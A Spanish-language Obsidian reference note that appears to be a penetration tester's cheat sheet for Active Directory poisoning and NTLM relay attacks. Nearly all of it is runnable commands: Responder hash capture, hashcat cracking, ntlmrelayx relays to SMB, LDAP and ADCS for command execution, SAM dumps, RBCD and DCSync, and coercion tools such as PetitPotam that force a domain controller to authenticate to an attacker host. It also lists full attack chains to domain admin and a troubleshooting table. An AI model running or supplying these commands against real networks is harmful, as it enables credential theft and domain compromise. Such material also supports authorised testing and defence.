---
tipo: meta
aliases:
  - relay NTLM
  - coacción de autenticación
  - PetitPotam
tags:
  - meta/referencia
  - dominio/ad
---

# AD envenenamiento y relay - matriz de referencia

> [!info] Referencia pura, no un zettel
> Los comandos de captura y retransmisión. El criterio está en [[Envenenamiento de resolución de nombres]] y [[Relay de NTLM]]; el modelo, en [[MOC - Active Directory]].

## 0. Decidir: capturar o retransmitir

| Situación | Rama |
|---|---|
| La contraseña puede ser débil | Capturar y romper → § 1-2 |
| Hay objetivos sin firma de SMB/LDAP | Retransmitir → § 3-5 |
| No sé | Correr `nxc smb 10.0.0.0/24` — la columna `signing` decide |

Sin firma → relay (no depende de romper). Todo firmado → solo queda capturar y romper.

## 1. Envenenar y capturar — Responder

```sh
# escuchar y responder a LLMNR/NBT-NS/mDNS
responder -I eth0 -wv

# solo análisis, sin responder (reconocimiento pasivo)
responder -I eth0 -A
```

Los hashes capturados quedan en `/usr/share/responder/logs/`. Formato `NetNTLMv2`.

Desactivar SMB y HTTP de Responder cuando se va a hacer relay (para no capturar en vez de reenviar): editar `Responder.conf`, `SMB = Off`, `HTTP = Off`.

## 2. Romper el NetNTLMv2

```sh
hashcat -m 5600 hash.txt rockyou.txt -r best64.rule
john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
```

`-m 5600` es NetNTLMv2. **No** sirve para pass-the-hash: solo se rompe o se retransmite.

## 3. Comprobar la firma — el prerrequisito del relay

```sh
nxc smb 10.0.0.0/24 --gen-relay-list objetivos.txt   # lista los que NO firman
nxc smb 10.0.0.0/24 | grep -i "signing:False"
nxc ldap 10.0.0.10 -u '' -p '' -M ldap-checker        # firma/binding de LDAP
```

Solo los que no firman son objetivos de relay.

## 4. Retransmitir — ntlmrelayx

```sh
# relay a SMB, ejecutar un comando
ntlmrelayx.py -tf objetivos.txt -smb2support -c 'powershell -enc ...'

# relay a SMB, volcar SAM
ntlmrelayx.py -tf objetivos.txt -smb2support

# relay a LDAP, configurar RBCD (la cadena moderna)
ntlmrelayx.py -t ldap://dc.dominio.local --delegate-access --escalate-user EVIL$

# relay a LDAP con víctima privilegiada → DCSync
ntlmrelayx.py -t ldap://dc.dominio.local --dump-dc

# relay a ADCS (ESC8) → certificado
ntlmrelayx.py -t http://ca.dominio.local/certsrv/certfnsh.asp --adcs --template DomainController
```

Con Responder desactivado en SMB/HTTP, ntlmrelayx recibe la autenticación envenenada y la reenvía.

## 5. Forzar la autenticación (coacción)

Para no esperar a que una máquina se autentique sola:

```
# printer bug (MS-RPRN)
printerbug.py dominio/user:pass@OBJETIVO ATACANTE
SpoolSample.exe OBJETIVO ATACANTE

# PetitPotam (MS-EFSRPC) — a veces sin credencial
PetitPotam.py -u user -p pass ATACANTE OBJETIVO
PetitPotam.py ATACANTE OBJETIVO           # anónimo, en versiones sin parche

# multi-método
Coercer.py coerce -u user -p pass -t OBJETIVO -l ATACANTE

# DFS (MS-DFSNM)
dfscoerce.py -u user -p pass ATACANTE OBJETIVO
```

La coacción hace que `OBJETIVO` (a menudo un DC) se autentique a `ATACANTE`, que envenena o retransmite esa autenticación.

## 6. Cadenas completas típicas

| Cadena | Resultado |
|---|---|
| Responder → NetNTLMv2 → hashcat | Primera credencial |
| Coacción DC → relay a LDAP → RBCD sobre el DC | Escalada a admin de dominio |
| Coacción DC → relay a ADCS (ESC8) → cert del DC | DCSync con el certificado |
| Responder → relay a SMB sin firma → SAM | Admin local en el objetivo |

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| Responder no captura nada | LLMNR/NBT-NS deshabilitados, o red segmentada |
| El hash no rompe | Contraseña fuerte; pasar a relay |
| El relay es rechazado | El objetivo exige firma; no está en la lista de `signing:False` |
| `STATUS_ACCESS_DENIED` en el relay | La víctima no tiene privilegio en el objetivo |
| El relay reflexivo falla | Mitigado por Microsoft; relay a un host distinto |
| PetitPotam anónimo no funciona | Parcheado; usar con credencial o probar otro coercer |
| ntlmrelayx recibe pero no reenvía | SMB/HTTP de Responder siguen encendidos, capturan en vez de ceder |

## Relacionadas

[[MOC - Active Directory]] · [[Envenenamiento de resolución de nombres]] · [[Relay de NTLM]] · [[AD delegaciones - matriz de referencia]] · [[AD persistencia - matriz de referencia]]
